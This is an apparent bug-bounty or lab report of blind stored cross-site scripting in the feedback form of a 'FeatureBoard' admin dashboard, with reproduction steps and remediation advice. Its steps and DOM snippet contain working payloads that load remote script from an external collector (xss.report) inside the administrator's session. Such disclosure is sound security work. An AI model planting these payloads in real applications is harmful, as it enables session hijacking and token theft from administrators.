## Title

Blind Cross-Site Scripting (XSS) via Unsanitized Feature Title and Submitter Fields on FeatureBoard Admin Dashboard.

## Affected URL

https://featureboard.pwnedbox.site/

## Description

A Blind Cross-Site Scripting (XSS) vulnerability was identified in the feature request submission handler of the FeatureBoard platform. User-supplied input submitted through request fields (such as Feature title and Your name) is stored persistently in the backend database without proper input sanitization, encoding, or output escaping.

When an administrative user reviews submitted feature requests within the admin dashboard inbox, the stored payloads—such as `<script src="https://xss.report/c/vansh"></script>`—are rendered directly into the Document Object Model (DOM). This causes the malicious script to execute asynchronously within the administrative user's privileged session context, allowing remote code execution, session hijacking, or administrative action compromise.

## Steps to Reproduce

1. Navigate to the target application public submission interface: `https://featureboard.pwnedbox.site/#submit`.
2. Locate the feature request submission form and inject JavaScript payloads into input fields (e.g., entering `'"&><script src="https://xss.report/c/vansh"></script>` into the Feature title and Your name fields).
3. Submit the feature request form.
4. Log into the administrative control panel where stored requests are reviewed (`https://featureboard.pwnedbox.site/admin/` inbox view).
5. Observe that the stored payload executes in the DOM of the administrative dashboard, firing requests to the external collector (`xss.report`).

## POC
<img width="1496" height="1330" alt="image" src="https://github.com/user-attachments/assets/d6595532-7205-4115-bbb0-359d6dadc9ed" />
<img width="945" height="400" alt="image" src="https://github.com/user-attachments/assets/df9c9d85-dd36-4db4-8931-6497df61c53b" />


### Vulnerable DOM Snippet

```html
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Admin dashboard</title>
    <link rel="stylesheet" href="../assets/style.css">
  </head>
  <body class="adminbody">
    <header class="adminnav">
      <div class="wrap nav">
        <a class="brand" href="../index.php"><span class="mark">F</span> FeatureBoard Admin</a>
        <nav class="links">
          <a href="../index.php">View board</a>
          <a href="logout.php">Log out</a>
        </nav>
      </div>
    </header>
    <div class="admin-shell">
      <aside class="side">
        <a class="active" href="index.php">Overview</a>
        <a href="index.php?status=under_review">Needs review</a>
        <a href="index.php?status=planned">Planned</a>
        <a href="index.php?status=in_progress">In progress</a>
        <a href="index.php?status=shipped">Shipped</a>
      </aside>
      <main class="main">
        <div style="display:flex;justify-content:space-between;align-items:end;gap:15px">
          <div>
            <div class="eyebrow">Operations</div>
            <h1 style="font-family:'Space Grotesk';margin:8px 0">Feedback inbox</h1>
            <p style="color:var(--muted)">Every submitted request, vote, and discussion in one place.</p>
          </div>
        </div>
        <div class="metrics">
          <div class="metric"><b>5</b><span>feature requests</span></div>
          <div class="metric"><b>317</b><span>community votes</span></div>
          <div class="metric"><b>0</b><span>comments</span></div>
          <div class="metric"><b>2</b><span>awaiting review</span></div>
        </div>
        <form class="toolbar" method="get">
          <input class="input search" name="q" value="" placeholder="Search title, name, email…">
          <select class="select" name="status" style="max-width:190px">
            <option value="">All statuses</option>
            <option value="under_review">Under Review</option>
            <option value="planned">Planned</option>
            <option value="in_progress">In Progress</option>
            <option value="shipped">Shipped</option>
            <option value="declined">Declined</option>
          </select>
          <button class="btn">Filter</button>
        </form>
        <div class="tablewrap">
          <table class="table">
            <thead>
              <tr>
                <th>Request</th>
                <th>Submitter</th>
                <th>Votes</th>
                <th>Status</th>
                <th>Updated</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td>
                  <a href="view.php?id=5"><b>'"&gt;<script src="[https://xss.report/c/vansh](https://xss.report/c/vansh)"></script></b></a><br>
                  <span style="color:var(--muted)">Product</span>
                </td>
                <td>'"&gt;<script src="[https://xss.report/c/vansh](https://xss.report/c/vansh)"></script><br><span style="color:var(--muted)">asd@gmail.com</span></td>
                <td>0</td>
                <td><span class="status under_review">Under Review</span></td>
                <td>Nov 9, 2026</td>
              </tr>
              <tr>
                <td>
                  <a href="view.php?id=4"><b>'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></b></a><br>
                  <span style="color:var(--muted)">Mobile</span>
                </td>
                <td>'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"><br><span style="color:var(--muted)">hello@gmail.com</span></td>
                <td>0</td>
                <td><span class="status under_review">Under Review</span></td>
                <td>Oct 22, 2026</td>
              </tr>
              <tr>
                <td><a href="view.php?id=1"><b>Offline mode for mobile</b></a><br><span style="color:var(--muted)">Mobile</span></td>
                <td>Maya Chen<br><span style="color:var(--muted)">maya@example.com</span></td>
                <td>148</td>
                <td><span class="status planned">Planned</span></td>
                <td>Oct 18, 2026</td>
              </tr>
            </tbody>
          </table>
        </div>
      </main>
    </div>
  </body>
</html>
```
## Impact
Execution of arbitrary JavaScript code within the high-privilege session of an administrator reviewing stored feature feedback.

Compromise of administrative sessions, potential cookie or token exfiltration, and unauthorized modification of feature request statuses or application data.

Persistent code execution affecting backend triage handlers and product management review panels.

## Remediation
Implement strict context-aware output encoding (such as HTML entity encoding) for all stored user inputs when rendering them in administrative tables, dashboards, or detail views.

Apply strict input validation and sanitization policies on all feature request submission endpoints (Feature title, Submitter Name, Email fields) to reject or neutralize HTML markup and script tags.

Deploy a comprehensive Content Security Policy (CSP) restricting inline script execution and unauthorized external script domains.
